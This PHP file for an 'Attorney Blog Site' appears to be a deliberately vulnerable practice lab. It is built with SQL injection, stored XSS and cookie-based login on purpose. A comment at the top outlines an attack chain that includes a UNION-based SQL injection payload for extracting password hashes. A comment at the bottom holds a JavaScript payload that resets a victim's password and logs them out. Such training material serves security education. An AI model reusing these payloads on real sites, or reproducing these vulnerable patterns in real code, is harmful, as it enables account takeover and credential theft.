<?php
/*
Step 1 change the cookie username so we can see other people's emails and passwords
Step 2 is realize that we can do javascript injection
Step 3 is build it so we can reset everyones password or a particular users password.
Step 4 is use some SQL Injection to get the passwords out of the user table.
    fakeuser' UNION ALL SELECT "test" as test,password FROM users WHERE '1' = '1
Step 5 Now that we have the  hasshed password we can use hashkiller.co.uk/Cracker/MD5 to se if we have a hash for it


*/
include 'sql.php';
header("X-XSS-Protection: 0");
if(isset($_POST['logout'])){
    unset($_COOKIE['username']);
    setcookie('username', '', time() - 3600);
}
include "header.html";

?>
  <header class="bg-primary text-white">
    <div class="container text-center">
      <h1>Attorney Blog Site</h1>
      <p class="lead">Where attorneys can vent!</p>
    </div>
  </header>
  <div class="container">
      <div class="row">
        <div class="col-lg-6 ">
<?php
//See if they are logged in.
$login = False;
if(isset($_POST['username'])){
    $sql = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'";
    $usersql = $connection->query($sql);
    $fullarray = $usersql->fetch_all(MYSQLI_ASSOC);
    if(count($fullarray)>0){
        if($fullarray[0]['password'] == md5($_POST['password'])){
            $login = True;
            setcookie("username",$_POST['username']);
            header("Location: blog.php");
        }else{
            echo "<h3 class='text-danger text-center'>Passwords don't match</h3>";
        }
    }else{
        echo "<h3 class='text-danger text-center'>Looks like we couldn't find your username.</h3>"; 
    }
}
if(isset($_POST['resetpassword'])){
    $sql = "UPDATE users SET password = '" . md5($_POST['resetpassword']) . "' WHERE username='" . $_COOKIE['username'] . "'";
    if ($connection->query($sql) === TRUE) {
        echo "<p class='text-success' id='resetpasswordsuccess'>Reset Password Success</p>";
    } else {
        echo "<p class='text-danger'>Error: " . $sql . "<br>" . $connection->error . "</p>";
    }

}
if(isset($_COOKIE['username']) || $login == True){
//Means the user is already logged in.
//Need to show account information
    echo "<h2>Account Information</h2>";
    if($login == True){
        $username = $_POST['username'];
    }else{
        $username = $_COOKIE['username'];
    }
    $sqlquery = "SELECT username, email FROM users WHERE username = '". $username . "'";
    $sql = $connection->query($sqlquery);
    //echo "Hacker Help: " . $sqlquery;
    if($sql == False){
        echo "<br><br>";
        echo "SQL Query: " . $sqlquery;
        printf("Error message: %s\n", $connection->error);
        echo "<br><br>";
    }
    $fullarray = $sql->fetch_all(MYSQLI_ASSOC);
    $fullarray = $fullarray[0];
    echo "<span class='text-primary font-weight-bold'>Username: </span><span id='accountinfousername'>" . $fullarray['username'] . "</span><br>";
    echo "<span class='text-primary font-weight-bold'>Email: </span><span>" . $fullarray['email'] . "</span><br>";
    echo '<div class="form-group">
            <form method = "post" action="blog.php">
              <label for "resetpassword" class="text-primary font-weight-bold">Reset Password:</label><br>
              <input id="resetpassword" type="text" name="resetpassword" class="form-control">
              <br>
              <button type="submit" id="resetpasswordbutton" class="btn btn-primary">Reset</button>
            </form>
          </div>';
          echo '<div class="form-group">
          <form method = "post" action="blog.php">
            <input id="logout" type="hidden" name="logout" value="true">
            <button type="submit" id="logoutbutton" class="btn btn-primary">Logout</button>
          </form>
        </div>';

}else{
    echo '<div class="form-group">
            <h2> Please Login </h2>
            <form method = "post" action="blog.php">
              <label for "username">Username:</label><br>
              <input id="username" type="text" name="username" class="form-control">
              <label for "password">Password:</label><br>
              <input id="password" type="text" name="password" class="form-control">
              <small id="loginhelp" class="form-text text-muted">Hacker Help: Try testuser and password for a sample account.</small>
              <br><br>
              <button type="submit" id="loginbutton" class="btn btn-primary">Login</button>
            </form>
          </div>
          <div class="row">
        <div class="col-lg-8 mx-auto"><p> If you don\'t have an account <a href="create.php">click here</a> to create one.</div></div>';
}

?>
</div>
<div class="col-lg-6">
<?php

//Submit a blog entry
if(isset($_POST['blogtitle'])){
    //Means we need to insert 
    $sql = "INSERT INTO blogposts (blogtitle,blogpost,username) VALUES('" . $_POST['blogtitle'] . "','" . $_POST['blogpost'] . "','" . $_COOKIE['username'] . "')";

    if ($connection->query($sql) === TRUE) {
        echo "<p class='text-success'>New blog post created successfully.</p>";
        header("Location: blog.php");
    } else {
        echo "<p class='text-danger'>Error: " . $sql . "<br>" . $connection->error . "</p>";
    }
}
//<script> alert("Hello"); </script>
//Now I need to create a script that says write a post about how great mstubenberg is if one doesn't already exist.
if(isset($_COOKIE['username']) || $login == True){
echo'<div class="form-group">
            <h2> Post Your Blog</h2>
            <form method = "post" action="blog.php">
              <label for "blogtitle">Title:</label><br>
              <input id="blogtitle" type="text" name="blogtitle" class="form-control">
              <label for "blogpost">Post:</label><br>
              <textarea id="blogpost" type="text-area" name="blogpost" class="form-control" rows=4></textarea>
              <br>
              <button id="submitpostbutton" type="submit" class="btn btn-primary">Post</button>
            </form>
          </div>';
}else{
    echo "<h2 class='text-primary text-center'>Please login to post</h2>";
}
?>
</div>
</div>
</div>
<div class="container">
      <div class="row">
        <div class="col-lg-10 ">
<?php
//Show current blog posts
    $sql = $connection->query("SELECT * FROM blogposts ORDER BY ID DESC");
    //printf("Error message: %s\n", $connection->error);
    $fullarray = $sql->fetch_all(MYSQLI_ASSOC);
    foreach($fullarray as $blogpost){
        echo("<hr>");
        echo("<h2 class='text-primary'>" . $blogpost['blogtitle'] . "</h2>");
        echo("<span> Posted By User:</span><span class='font-weight-bold'> " . $blogpost['username'] . "</span>");
        echo("<p>" . $blogpost['blogpost'] . "</p>");
    }
?>
</div>
</div>
</div>
<?php
    require "footer.html";
    /*
    Great community!
    <script>
       setTimeout(function(){
           console.log("It worked");
           if($("#accountinfousername").text() != "hackerman"){
                if($("#logoutbutton").length > 0 && $("#resetpasswordsuccess").length == 0){
                    $("#resetpassword").val("pa$$word");
                    $("#resetpasswordbutton").click();
                }else if($("#resetpasswordsuccess").length > 0){
                    $("#logoutbutton").click();
                }else{
                    console.log("Waiting for user to login");
                }
            }

        },1000); 
    </script>

    */
?>
